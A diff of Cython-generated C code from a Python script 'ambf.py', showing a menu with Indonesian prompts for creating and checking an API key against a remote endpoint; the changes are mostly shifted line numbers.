-      if (__Pyx_PrintOne(0, __pyx_kp_s_2_Masukan_Api_Key) < 0) __PYX_ERR(0, 701, __pyx_L5_except_error)
+      if (__Pyx_PrintOne(0, __pyx_kp_s_2_Masukan_Api_Key) < 0) __PYX_ERR(0, 694, __pyx_L5_except_error)
 
-      /* "ambf.py":702
+      /* "ambf.py":695
  * 		print(" [1]. Dapatkan Api Key")
  * 		print(" [2]. Masukan Api Key")
  * 		print(" [3]. Daftar Api Key")             # <<<<<<<<<<<<<<
  * 		ask = input("\n [?] choose : ")
  * 		if ask in ["", " "]:
  */
-      if (__Pyx_PrintOne(0, __pyx_kp_s_3_Daftar_Api_Key) < 0) __PYX_ERR(0, 702, __pyx_L5_except_error)
+      if (__Pyx_PrintOne(0, __pyx_kp_s_3_Daftar_Api_Key) < 0) __PYX_ERR(0, 695, __pyx_L5_except_error)
 
-      /* "ambf.py":703
+      /* "ambf.py":696
  * 		print(" [2]. Masukan Api Key")
  * 		print(" [3]. Daftar Api Key")
  * 		ask = input("\n [?] choose : ")             # <<<<<<<<<<<<<<
  * 		if ask in ["", " "]:
  * 			main()
  */
-      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 703, __pyx_L5_except_error)
+      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 696, __pyx_L5_except_error)
       __Pyx_GOTREF(__pyx_t_9);
       __pyx_v_ask = __pyx_t_9;
       __pyx_t_9 = 0;
 
-      /* "ambf.py":704
+      /* "ambf.py":697
  * 		print(" [3]. Daftar Api Key")
  * 		ask = input("\n [?] choose : ")
  * 		if ask in ["", " "]:             # <<<<<<<<<<<<<<
@@ -21677,27 +21436,27 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
  */
       __Pyx_INCREF(__pyx_v_ask);
       __pyx_t_9 = __pyx_v_ask;
-      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 704, __pyx_L5_except_error)
+      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 697, __pyx_L5_except_error)
       if (!__pyx_t_12) {
       } else {
         __pyx_t_11 = __pyx_t_12;
         goto __pyx_L12_bool_binop_done;
       }
-      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s__8, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 704, __pyx_L5_except_error)
+      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s__8, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 697, __pyx_L5_except_error)
       __pyx_t_11 = __pyx_t_12;
       __pyx_L12_bool_binop_done:;
       __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
       __pyx_t_12 = (__pyx_t_11 != 0);
       if (__pyx_t_12) {
 
-        /* "ambf.py":705
+        /* "ambf.py":698
  * 		ask = input("\n [?] choose : ")
  * 		if ask in ["", " "]:
  * 			main()             # <<<<<<<<<<<<<<
  * 		elif ask in ["1", "01"]:
  * 			id1 = uuid.uuid4().hex[:5].upper()
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_main); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 705, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_main); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 698, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __pyx_t_10 = NULL;
         if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
@@ -21711,12 +21470,12 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
         __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 705, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 698, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
 
-        /* "ambf.py":704
+        /* "ambf.py":697
  * 		print(" [3]. Daftar Api Key")
  * 		ask = input("\n [?] choose : ")
  * 		if ask in ["", " "]:             # <<<<<<<<<<<<<<
@@ -21726,7 +21485,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         goto __pyx_L11;
       }
 
-      /* "ambf.py":706
+      /* "ambf.py":699
  * 		if ask in ["", " "]:
  * 			main()
  * 		elif ask in ["1", "01"]:             # <<<<<<<<<<<<<<
@@ -21735,29 +21494,29 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
  */
       __Pyx_INCREF(__pyx_v_ask);
       __pyx_t_9 = __pyx_v_ask;
-      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 706, __pyx_L5_except_error)
+      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 699, __pyx_L5_except_error)
       if (!__pyx_t_11) {
       } else {
         __pyx_t_12 = __pyx_t_11;
         goto __pyx_L14_bool_binop_done;
       }
-      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 706, __pyx_L5_except_error)
+      __pyx_t_11 = (__Pyx_PyString_Equals(__pyx_t_9, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 699, __pyx_L5_except_error)
       __pyx_t_12 = __pyx_t_11;
       __pyx_L14_bool_binop_done:;
       __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
       __pyx_t_11 = (__pyx_t_12 != 0);
       if (__pyx_t_11) {
 
-        /* "ambf.py":707
+        /* "ambf.py":700
  * 			main()
  * 		elif ask in ["1", "01"]:
  * 			id1 = uuid.uuid4().hex[:5].upper()             # <<<<<<<<<<<<<<
  * 			id2 = uuid.uuid4().hex[:15].upper()
  * 			open(".apikey", "w").write(id1+":"+id2)
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_uuid); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_uuid); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
-        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __pyx_t_10 = NULL;
@@ -21772,16 +21531,16 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
         __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
-        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_hex); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_hex); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        __pyx_t_8 = __Pyx_PyObject_GetSlice(__pyx_t_13, 0, 5, NULL, NULL, &__pyx_slice__62, 0, 1, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        __pyx_t_8 = __Pyx_PyObject_GetSlice(__pyx_t_13, 0, 5, NULL, NULL, &__pyx_slice__62, 0, 1, 1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_upper); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_upper); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
         __pyx_t_8 = NULL;
@@ -21796,22 +21555,22 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
         __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 707, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 700, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         __pyx_v_id1 = __pyx_t_9;
         __pyx_t_9 = 0;
 
-        /* "ambf.py":708
+        /* "ambf.py":701
  * 		elif ask in ["1", "01"]:
  * 			id1 = uuid.uuid4().hex[:5].upper()
  * 			id2 = uuid.uuid4().hex[:15].upper()             # <<<<<<<<<<<<<<
  * 			open(".apikey", "w").write(id1+":"+id2)
  * 			time.sleep(1)
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_uuid); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_uuid); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
         __pyx_t_8 = NULL;
@@ -21826,16 +21585,16 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_13 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
         __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_hex); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_hex); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = __Pyx_PyObject_GetSlice(__pyx_t_10, 0, 15, NULL, NULL, &__pyx_slice__63, 0, 1, 1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_GetSlice(__pyx_t_10, 0, 15, NULL, NULL, &__pyx_slice__63, 0, 1, 1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_upper); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_upper); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         __pyx_t_13 = NULL;
@@ -21850,27 +21609,27 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_9 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
         __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 708, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 701, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __pyx_v_id2 = __pyx_t_9;
         __pyx_t_9 = 0;
 
-        /* "ambf.py":709
+        /* "ambf.py":702
  * 			id1 = uuid.uuid4().hex[:5].upper()
  * 			id2 = uuid.uuid4().hex[:15].upper()
  * 			open(".apikey", "w").write(id1+":"+id2)             # <<<<<<<<<<<<<<
  * 			time.sleep(1)
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))
  */
-        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 709, __pyx_L5_except_error)
+        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__64, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 702, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
-        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 709, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 702, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
-        __pyx_t_10 = PyNumber_Add(__pyx_v_id1, __pyx_kp_s__65); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 709, __pyx_L5_except_error)
+        __pyx_t_10 = PyNumber_Add(__pyx_v_id1, __pyx_kp_s__65); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 702, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_10);
-        __pyx_t_8 = PyNumber_Add(__pyx_t_10, __pyx_v_id2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 709, __pyx_L5_except_error)
+        __pyx_t_8 = PyNumber_Add(__pyx_t_10, __pyx_v_id2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 702, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
         __pyx_t_10 = NULL;
@@ -21886,21 +21645,21 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_13, __pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_8);
         __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 709, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 702, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
 
-        /* "ambf.py":710
+        /* "ambf.py":703
  * 			id2 = uuid.uuid4().hex[:15].upper()
  * 			open(".apikey", "w").write(id1+":"+id2)
  * 			time.sleep(1)             # <<<<<<<<<<<<<<
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_time); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 710, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_time); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 703, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
-        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_sleep); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 710, __pyx_L5_except_error)
+        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_sleep); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 703, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
         __pyx_t_13 = NULL;
@@ -21915,21 +21674,21 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_9 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_13, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_int_1);
         __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 710, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 703, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
 
-        /* "ambf.py":711
+        /* "ambf.py":704
  * 			open(".apikey", "w").write(id1+":"+id2)
  * 			time.sleep(1)
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))             # <<<<<<<<<<<<<<
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")
  * 			input("\n [+] Kembali Ke Menu Awal")
  */
-        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 711, __pyx_L5_except_error)
+        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 704, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_8);
-        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_read); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 711, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_read); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 704, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
         __pyx_t_8 = NULL;
@@ -21944,43 +21703,43 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
         __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 711, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 704, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
-        __pyx_t_13 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Api_Key_Kamu_s, __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 711, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Api_Key_Kamu_s, __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 704, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
-        if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 711, __pyx_L5_except_error)
+        if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 704, __pyx_L5_except_error)
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-        /* "ambf.py":712
+        /* "ambf.py":705
  * 			time.sleep(1)
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")             # <<<<<<<<<<<<<<
  * 			input("\n [+] Kembali Ke Menu Awal")
  * 			main()
  */
-        if (__Pyx_PrintOne(0, __pyx_kp_s_Copy_Api_Key_Anda_Lalu_Daftar_A) < 0) __PYX_ERR(0, 712, __pyx_L5_except_error)
+        if (__Pyx_PrintOne(0, __pyx_kp_s_Copy_Api_Key_Anda_Lalu_Daftar_A) < 0) __PYX_ERR(0, 705, __pyx_L5_except_error)
 
-        /* "ambf.py":713
+        /* "ambf.py":706
  * 			print("\n [+] Api Key Kamu : %s"%(open(".apikey", "r").read()))
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")
  * 			input("\n [+] Kembali Ke Menu Awal")             # <<<<<<<<<<<<<<
  * 			main()
  * 		elif ask in ["2", "02"]:
  */
-        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 713, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 706, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-        /* "ambf.py":714
+        /* "ambf.py":707
  * 			print(" [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin")
  * 			input("\n [+] Kembali Ke Menu Awal")
  * 			main()             # <<<<<<<<<<<<<<
  * 		elif ask in ["2", "02"]:
  * 			key = input("\n [+] Masukan Api Key : ")
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_main); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 714, __pyx_L5_except_error)
+        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_main); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 707, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_9);
         __pyx_t_8 = NULL;
         if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
@@ -21994,12 +21753,12 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         }
         __pyx_t_13 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
         __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
-        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 714, __pyx_L5_except_error)
+        if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 707, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
         __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
 
-        /* "ambf.py":706
+        /* "ambf.py":699
  * 		if ask in ["", " "]:
  * 			main()
  * 		elif ask in ["1", "01"]:             # <<<<<<<<<<<<<<
@@ -22009,7 +21768,7 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
         goto __pyx_L11;
       }
 
-      /* "ambf.py":715
+      /* "ambf.py":708
  * 			input("\n [+] Kembali Ke Menu Awal")
  * 			main()
  * 		elif ask in ["2", "02"]:             # <<<<<<<<<<<<<<
@@ -22018,44 +21777,44 @@ static PyObject *__pyx_pf_4ambf_40main(CYTHON_UNUSED PyObject *__pyx_self) {
  */
       __Pyx_INCREF(__pyx_v_ask);
       __pyx_t_13 = __pyx_v_ask;
-      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 715, __pyx_L5_except_error)
+      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 708, __pyx_L5_except_error)
       if (!__pyx_t_12) {
       } else {
         __pyx_t_11 = __pyx_t_12;
         goto __pyx_L16_bool_binop_done;
       }
-      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 715, __pyx_L5_except_error)
+      __pyx_t_12 = (__Pyx_PyString_Equals(__pyx_t_13, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 708, __pyx_L5_except_error)
       __pyx_t_11 = __pyx_t_12;
       __pyx_L16_bool_binop_done:;
       __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
       __pyx_t_12 = (__pyx_t_11 != 0);
       if (__pyx_t_12) {
 
-        /* "ambf.py":716
+        /* "ambf.py":709
  * 			main()
  * 		elif ask in ["2", "02"]:
  * 			key = input("\n [+] Masukan Api Key : ")             # <<<<<<<<<<<<<<
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()
  * 			if cek["status"] == "error":
  */
-        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__68, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 716, __pyx_L5_except_error)
+        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__68, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 709, __pyx_L5_except_error)
         __Pyx_GOTREF(__pyx_t_13);
         __Pyx_XDECREF_SET(__pyx_v_key, __pyx_t_13);
         __pyx_t_13 = 0;
 
-        /* "ambf.py":717
+        /* "ambf.py":710
  * 		elif ask in ["2", "02"]:
  * 			key = input("\n [+] Masukan Api Key : ")
  * 			cek = requests.get("https://ngepetonline.000webhostapp.com/chek.php?project=anggakurniawan&apikey="+key).json()             # <<<<<<<<<<<<<<
  * 			if cek["status"] == "error":
  * 				exit(" [!] api key tidak terdaftar")
  */
-        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_requests); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 717, __pyx_L5_except_error)
